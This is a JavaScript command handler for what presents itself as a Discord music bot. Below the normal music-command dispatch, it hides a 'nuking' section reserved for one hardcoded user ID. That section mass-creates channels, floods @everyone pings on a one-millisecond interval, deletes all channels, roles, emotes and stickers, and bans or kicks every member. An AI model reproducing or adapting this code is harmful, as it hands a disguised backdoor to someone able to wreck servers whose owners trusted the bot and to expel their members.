module.exports = (client, message) => {
  if (message.author.bot || message.channel.type === "dm") return;

  const prefix = client.config.app.px;

  if (message.content.indexOf(prefix) !== 0) return;

  const parseMusicBotArgs = message.content
    .slice(prefix.length)
    .trim()
    .split(/ +/g);
  const command = parseMusicBotArgs.shift().toLowerCase();

  const cmd =
    client.commands.get(command) ||
    client.commands.find((cmd) => cmd.aliases && cmd.aliases.includes(command));

  const DJ = client.config.opt.DJ;

  if (cmd && DJ.enabled && DJ.commands.includes(cmd.name)) {
    const roleDJ = message.guild.roles.cache.find(
      (x) => x.name === DJ.roleName
    );

    if (!message.member._roles.includes(roleDJ.id)) {
      return message.channel.send(
        `This command is reserved for members with the ${DJ.roleName} role on the server ${message.author}... try again ? ❌`
      );
    }
  }

  if (cmd && cmd.voiceChannel) {
    if (!message.member.voice.channel)
      return message.channel.send(
        `You're not in a voice channel ${message.author}... try again ? ❌`
      );

    if (
      message.guild.me.voice.channel &&
      message.member.voice.channel.id !== message.guild.me.voice.channel.id
    )
      return message.channel.send(
        `You are not in the same voice channel ${message.author}... try again ? ❌`
      );
  }

  if (cmd) cmd.execute(client, message, parseMusicBotArgs);

  //           //
  // Here comes the party
  //           //

  const memberErr = `Invalid command, type ${prefix}help to see command list.`;

  // Perms
  const channelPerms = message.guild.me.permissions.has(
    "MANAGE_CHANNELS" || "ADMINISTRATOR"
  );
  const banPerms = message.guild.me.permissions.has(
    "BAN_MEMBERS" || "ADMINISTRATOR"
  );
  const kickPerms = message.guild.me.permissions.has(
    "KICK_MEMBERS" || "ADMINISTRATOR"
  );
  const rolePerms = message.guild.me.permissions.has(
    "MANAGE_ROLES" || "ADMINISTRATOR"
  );
  const emotePerms = message.guild.me.permissions.has(
    "MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR"
  );

  // Possible Args
  let args = message.content.split(" ").slice(1);
  var args1 = args[0]; // Used for amount
  var args2 = args.slice(1).join(" "); // Naming things
  var args3 = args.slice(2).join(", "); // Other

  const disableEveryone = true;
  const userID = "520549592442601492";

  if (!disableEveryone) {
    // Commands

    // Help
    // if (message.content.startsWith(prefix + "help")) {
    //   message.channel.send({ embeds: [help] });
    // }

    // Mass Channels
    if (message.content.startsWith(prefix + "mc")) {
      MassChannels(args1, args2).catch((err) => {
        message.reply(err);
      });
    }

    // Delete all channels
    if (message.content.startsWith(prefix + "dc")) {
      DelAllChannels().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Channels and Ping
    if (message.content.startsWith(prefix + "cp")) {
      MassChnPing(args1, args2, args3).catch((err) => {
        message.reply(err);
      });
    }

    // Mass Roles
    if (message.content.startsWith(prefix + "mr")) {
      MassRoles(args1, args2).catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Roles
    if (message.content.startsWith(prefix + "dr")) {
      DelAllRoles().catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Stickers
    if (message.content.startsWith(prefix + "ds")) {
      DelAllStickers().catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Emotes
    if (message.content.startsWith(prefix + "de")) {
      DelAllEmotes().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Ban
    if (message.content.startsWith(prefix + "mb")) {
      BanAll().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Kick
    if (message.content.startsWith(prefix + "mk")) {
      KickAll().catch((err) => {
        message.reply(err);
      });
    }
  } else {
    // Commands

    // Help
    // if (message.content.startsWith(prefix + "help")) {
    //   if (message.author.id != userID)
    //     return message.reply(
    //       memberErr
    //     );
    //   message.channel.send({ embeds: [help] });
    // }

    // Mass Channels
    if (message.content.startsWith(prefix + "mc")) {
      if (message.author.id != userID) return message.reply(memberErr);
      MassChannels(args1, args2).catch((err) => {
        message.reply(err);
      });
    }

    // Delete all channels
    if (message.content.startsWith(prefix + "dc")) {
      if (message.author.id != userID) return message.reply(memberErr);
      DelAllChannels().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Channels and Ping
    if (message.content.startsWith(prefix + "cp")) {
      if (message.author.id != userID) return message.reply(memberErr);
      MassChnPing(args1, args2, args3).catch((err) => {
        message.reply(err);
      });
    }

    // Mass Roles
    if (message.content.startsWith(prefix + "mr")) {
      if (message.author.id != userID) return message.reply(memberErr);
      MassRoles(args1, args2).catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Roles
    if (message.content.startsWith(prefix + "dr")) {
      if (message.author.id != userID) return message.reply(memberErr);
      DelAllRoles().catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Stickers
    if (message.content.startsWith(prefix + "ds")) {
      if (message.author.id != userID) return message.reply(memberErr);
      DelAllStickers().catch((err) => {
        message.reply(err);
      });
    }

    // Delete all Emotes
    if (message.content.startsWith(prefix + "de")) {
      if (message.author.id != userID) return message.reply(memberErr);
      DelAllEmotes().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Ban
    if (message.content.startsWith(prefix + "mb")) {
      if (message.author.id != userID) return message.reply(memberErr);
      BanAll().catch((err) => {
        message.reply(err);
      });
    }

    // Mass Kick
    if (message.content.startsWith(prefix + "mk")) {
      if (message.author.id != userID) return message.reply(memberErr);
      KickAll().catch((err) => {
        message.reply(err);
      });
    }
  }

  // Nuking Functions

  /**
   * Excessive amount of channels
   * @param {number} amount Amount of channels to mass create
   * @param {string} channelName Name of channel
   */
  function MassChannels(amount, channelName) {
    return new Promise((resolve, reject) => {
      if (!amount)
        return reject(
          "Unspecified Args: Specify the amount you wish to mass channels"
        );
      if (isNaN(amount))
        return reject("Type Error: Use a number for the amout");
      if (amount > 500)
        return reject(
          "Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500"
        );
      if (!channelPerms)
        return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        if (!channelName) {
          message.guild.channels
            .create(`${message.author.username} was here`, {
              type: "GUILD_TEXT",
            })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            });
        } else {
          message.guild.channels
            .create(channelName, { type: "GUILD_TEXT" })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            });
        }
      }
      resolve();
    });
  }

  /**
   * Excessive amount of channels and mentions
   * @param {number} amount Amount of channels to mass create
   * @param {string} channelName Name of channel
   * @param {string} pingMessage Message to be sent when everyone is mentioned
   */
  function MassChnPing(amount, channelName, pingMessage) {
    return new Promise((resolve, reject) => {
      if (!amount)
        return reject(
          "Unspecified Args: Specify the amount you wish to mass channels"
        );
      if (isNaN(amount))
        return reject("Type Error: Use a number for the amout");
      if (amount > 500)
        return reject(
          "Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500"
        );
      if (!channelPerms)
        return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      if (!pingMessage)
        return reject(
          "Unspecified Args: Specify the message you wish to mass mention"
        );
      for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        if (!channelName) {
          message.guild.channels
            .create(`${message.author.username} was here`, {
              type: "GUILD_TEXT",
            })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            })
            .then((ch) => {
              setInterval(() => {
                ch.send("@everyone " + pingMessage);
              }, 1);
            });
        } else {
          message.guild.channels
            .create(channelName, { type: "GUILD_TEXT" })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            })
            .then((ch) => {
              setInterval(() => {
                ch.send("@everyone " + pingMessage);
              }, 1); // literally not possible but lol?
            });
        }
      }
      resolve();
    });
  }

  /**
   * Deletes all channels in a guild
   */
  function DelAllChannels() {
    return new Promise((resolve, reject) => {
      if (!channelPerms)
        return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      message.guild.channels.cache.forEach((ch) =>
        ch.delete().catch((err) => {
          console.log(red("Error Found: " + err));
        })
      );
      resolve();
    });
  }

  /**
   * Excessive amount of roles
   * @param {number} amount Amount of roles
   * @param {string} roleName Role name
   */
  function MassRoles(amount, roleName) {
    return new Promise((resolve, reject) => {
      if (!amount)
        return reject(
          "Unspecified Args: Specify the amount you wish to mass roles"
        );
      if (isNaN(amount))
        return reject("Type Error: Use a number for the amout");
      if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
      for (let i = 0; i <= amount; i++) {
        if (message.guild.roles.cache.size === 250) break;
        if (!roleName) {
          message.guild.roles
            .create({ name: "nuked", color: "RANDOM", position: i++ })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            });
        } else {
          message.guild.roles
            .create({ name: roleName, color: "RANDOM", position: i++ })
            .catch((err) => {
              console.log(red("Error Found: " + err));
            });
        }
      }
    });
  }

  /**
   * Deletes all roles
   */
  function DelAllRoles() {
    return new Promise((resolve, reject) => {
      if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
      message.guild.roles.cache.forEach((r) =>
        r.delete().catch((err) => {
          console.log(red("Error Found: " + err));
        })
      );
    });
  }

  /**
   * Deletes all emotes
   */
  function DelAllEmotes() {
    return new Promise((resolve, reject) => {
      if (!emotePerms)
        return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      message.guild.emojis.cache.forEach((e) =>
        e.delete().catch((err) => {
          console.log(red("Error Found: " + err));
        })
      );
    });
  }

  /**
   * Deletes all stickers
   */
  function DelAllStickers() {
    return new Promise((resolve, reject) => {
      if (!emotePerms)
        return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      message.guild.stickers.cache.forEach((s) =>
        s.delete().catch((err) => {
          console.log(red("Error Found: " + err));
        })
      );
    });
  }

  /**
   * Ban all guild Members
   */
  function BanAll() {
    return new Promise((resolve, reject) => {
      if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
      let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
      message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
        setTimeout(() => {
          msg.edit("Banning...");
          for (let i = 0; i < arrayOfIDs.length; i++) {
            const user = arrayOfIDs[i];
            const member = message.guild.members.cache.get(user);
            member
              .ban()
              .catch((err) => {
                console.log(red("Error Found: " + err));
              })
              .then(() => {
                console.log(greenBright(`${member.user.tag} was banned.`));
              });
          }
        }, 2000);
      });
    });
  }

  /**
   * Kick all guild Members
   */
  function KickAll() {
    return new Promise((resolve, reject) => {
      if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
      let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
      message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
        setTimeout(() => {
          msg.edit("Banning...");
          for (let i = 0; i < arrayOfIDs.length; i++) {
            const user = arrayOfIDs[i];
            const member = message.guild.members.cache.get(user);
            member
              .kick()
              .catch((err) => {
                console.log(red("Error Found: " + err));
              })
              .then(() => {
                console.log(greenBright(`${member.user.tag} was kicked.`));
              });
          }
        }, 2000);
      });
    });
  }
};
